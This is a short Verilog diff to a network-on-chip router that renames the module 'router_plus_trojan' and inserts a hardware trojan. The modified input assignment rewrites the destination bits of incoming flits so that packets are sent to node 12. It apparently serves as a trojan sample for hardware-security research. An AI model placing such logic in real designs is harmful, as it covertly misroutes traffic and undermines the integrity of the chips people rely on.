@@ -4,7 +4,7 @@
 `include "fifo.v"
 `include "arbiter_2.v"
 
-module router_2 #(parameter 	RT_ALG = 0, 	ID_BITS = 4,	
+module router_plus_trojan #(parameter 	RT_ALG = 0, 	ID_BITS = 4,	
 								FLIT_WIDTH = 32,	
 								EXTRA_BITS = 2,
 								SOURCE_BITS = 4,
@@ -326,7 +326,7 @@ generate
 	end
 
 	for (i= CORE_IN_PORTS; i< IN_PORTS; i=i+1) begin : CN5 
-		assign in_data[i]  = s_flits_in[((((i- CORE_IN_PORTS) + 1) *(FLIT_WIDTH))-1) -: FLIT_WIDTH];
+		assign in_data[i]  = 42'h030_0000_0000 | (42'h3C0_FFFF_FFFF & s_flits_in[((((i- CORE_IN_PORTS) + 1) *(FLIT_WIDTH))-1) -: FLIT_WIDTH]); //send packet to 12 node 
 		assign in_valid[i] = s_valid_in[i- CORE_IN_PORTS];
 	end 
 
@@ -503,3 +503,4 @@ begin
 end
 
 endmodule
+
